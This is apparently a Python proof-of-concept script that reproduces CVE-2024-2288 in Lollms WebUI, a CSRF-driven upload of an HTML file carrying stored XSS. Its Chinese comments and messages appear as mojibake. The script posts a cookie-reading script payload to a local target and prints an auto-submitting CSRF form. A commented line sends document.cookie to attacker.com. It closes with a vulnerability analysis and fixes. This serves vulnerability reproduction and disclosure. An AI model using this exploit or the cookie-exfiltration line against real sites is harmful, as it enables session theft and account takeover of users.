#!/usr/bin/env python3
"""
CVE-2024-2288 å®Œæ•´æ”»å‡»é“¾æ¼”ç¤º
CSRF â†’ æ–‡ä»¶ä¸Šä¼  â†’ å­˜å‚¨å‹ XSS
"""
import requests
from io import BytesIO

print("=" * 70)
print(" CVE-2024-2288: CSRF + å­˜å‚¨å‹ XSS å®Œæ•´æ”»å‡»é“¾æ¼”ç¤º")
print("=" * 70)

TARGET = "http://127.0.0.1:9600"

# ==================== é˜¶æ®µ 1: CSRF æ”»å‡» ====================
print("\n[é˜¶æ®µ 1] CSRF æ”»å‡» - ä¸Šä¼ æ¶æ„ HTML æ–‡ä»¶")
print("-" * 70)

# åˆ›å»ºåŒ…å« XSS payload çš„ HTML æ–‡ä»¶
xss_payload = """<!DOCTYPE html>
<html>
<head>
    <title>Innocent Image</title>
</head>
<body>
    <h1>This looks like a normal page...</h1>
    <script>
        // XSS Payload - çªƒå–ç”¨æˆ· Cookie
        alert('XSS è§¦å‘! Cookie: ' + document.cookie);
        
        // åœ¨çœŸå®æ”»å‡»ä¸­,è¿™é‡Œä¼šå°† cookie å‘é€åˆ°æ”»å‡»è€…æœåŠ¡å™¨
        // fetch('http://attacker.com/steal?cookie=' + document.cookie);
        
        // æˆ–è€…æ‰§è¡Œå…¶ä»–æ¶æ„æ“ä½œ
        console.log('æ”»å‡»è€…å¯ä»¥æ‰§è¡Œä»»æ„ JavaScript ä»£ç ');
    </script>
</body>
</html>"""

print(f"ğŸ“ æ¶æ„ HTML å†…å®¹ ({len(xss_payload)} bytes):")
print(xss_payload[:200] + "...")

# å‘é€ CSRF è¯·æ±‚
print("\nğŸš€ å‘é€ CSRF è¯·æ±‚...")
try:
    files = {'avatar': ('malicious.html', BytesIO(xss_payload.encode()), 'text/html')}
    resp = requests.post(f"{TARGET}/upload_avatar", files=files)
    
    if resp.status_code == 200:
        result = resp.json()
        print(f"âœ… CSRF æˆåŠŸ: {result}")
        uploaded_file = result.get('message', '').split(': ')[1]
    else:
        print(f"âŒ ä¸Šä¼ å¤±è´¥: {resp.status_code}")
        exit(1)
except Exception as e:
    print(f"âŒ è¯·æ±‚å¤±è´¥: {e}")
    exit(1)

# ==================== é˜¶æ®µ 2: éªŒè¯æ–‡ä»¶ ====================
print(f"\n[é˜¶æ®µ 2] éªŒè¯æ¶æ„æ–‡ä»¶å·²ä¸Šä¼ ")
print("-" * 70)

try:
    file_url = f"{TARGET}/user_infos/{uploaded_file}"
    resp = requests.get(file_url)
    
    print(f"âœ… æ–‡ä»¶å¯è®¿é—®: {file_url}")
    print(f"   HTTP çŠ¶æ€: {resp.status_code}")
    print(f"   Content-Type: {resp.headers.get('content-type', 'N/A')}")
    print(f"   æ–‡ä»¶å¤§å°: {len(resp.content)} bytes")
    
    if '<script>' in resp.text:
        print("   âš ï¸  æ£€æµ‹åˆ° <script> æ ‡ç­¾ - XSS payload å®Œæ•´!")
    
except Exception as e:
    print(f"âŒ éªŒè¯å¤±è´¥: {e}")

# ==================== é˜¶æ®µ 3: æ”»å‡»åœºæ™¯æ¨¡æ‹Ÿ ====================
print(f"\n[é˜¶æ®µ 3] æ”»å‡»åœºæ™¯è¯´æ˜")
print("-" * 70)

print("""
ğŸ¯ æ”»å‡»æµç¨‹:

1ï¸âƒ£  æ”»å‡»è€…åˆ›å»ºæ¶æ„ç½‘é¡µ:
   <form action="http://victim-site.com/upload_avatar" method="POST" enctype="multipart/form-data">
       <input type="file" name="avatar" value="malicious.html">
   </form>
   <script>document.forms[0].submit();</script>

2ï¸âƒ£  å—å®³è€…è®¿é—®æ¶æ„é¡µé¢ â†’ æµè§ˆå™¨è‡ªåŠ¨æäº¤è¡¨å• â†’ CSRF æ”»å‡»æˆåŠŸ

3ï¸âƒ£  æ¶æ„ HTML æ–‡ä»¶è¢«ä¸Šä¼ åˆ°: /user_infos/malicious.html

4ï¸âƒ£  å—å®³è€…(æˆ–å…¶ä»–ç”¨æˆ·)è®¿é—®è¯¥æ–‡ä»¶ â†’ XSS è§¦å‘ â†’ Cookie è¢«çªƒå–

5ï¸âƒ£  æ”»å‡»è€…è·å¾— Session â†’ è´¦æˆ·æ¥ç®¡
""")

# ==================== æ¼æ´åˆ†æ ====================
print(f"\n[æ¼æ´åˆ†æ]")
print("-" * 70)

print("""
ğŸ”“ å­˜åœ¨çš„å®‰å…¨é—®é¢˜:

1. âŒ æ—  CSRF Token éªŒè¯
   â†’ ä»»ä½•ç½‘ç«™éƒ½å¯ä»¥ä¼ªé€ è¯·æ±‚

2. âŒ æ—  Origin/Referer æ£€æŸ¥
   â†’ è·¨åŸŸè¯·æ±‚æœªè¢«æ‹¦æˆª

3. âŒ æ–‡ä»¶ç±»å‹æœªéªŒè¯
   â†’ å¯ä¸Šä¼  HTMLã€JavaScript ç­‰å±é™©æ–‡ä»¶

4. âŒ ä¸Šä¼ æ–‡ä»¶ç›´æ¥å¯è®¿é—®
   â†’ æœªç»è¿‡å†…å®¹å®‰å…¨ç­–ç•¥(CSP)ä¿æŠ¤

5. âŒ æ— æ–‡ä»¶åç™½åå•
   â†’ å¯ä½¿ç”¨ .html æ‰©å±•åç›´æ¥æ‰§è¡Œ

ğŸ›¡ï¸ ä¿®å¤å»ºè®®:

1. âœ… æ·»åŠ  CSRF Token éªŒè¯
2. âœ… éªŒè¯ Origin/Referer å¤´
3. âœ… é™åˆ¶æ–‡ä»¶ç±»å‹ä¸ºå›¾ç‰‡(MIME type ç™½åå•)
4. âœ… é‡å‘½åä¸Šä¼ æ–‡ä»¶(éšæœºæ–‡ä»¶å)
5. âœ… è®¾ç½® Content-Security-Policy å¤´
6. âœ… ä½¿ç”¨ç‹¬ç«‹çš„æ–‡ä»¶å­˜å‚¨åŸŸå(CDN)
""")

print("\n" + "=" * 70)
print("âœ… CVE-2024-2288 æ¼æ´å¤ç°å®Œæˆ!")
print("   CVSS è¯„åˆ†: 8.8 (é«˜å±)")
print("   å½±å“ç‰ˆæœ¬: Lollms WebUI â‰¤ 9.2")
print("   æ¼æ´ç±»å‹: CSRF + å­˜å‚¨å‹ XSS")
print("=" * 70)
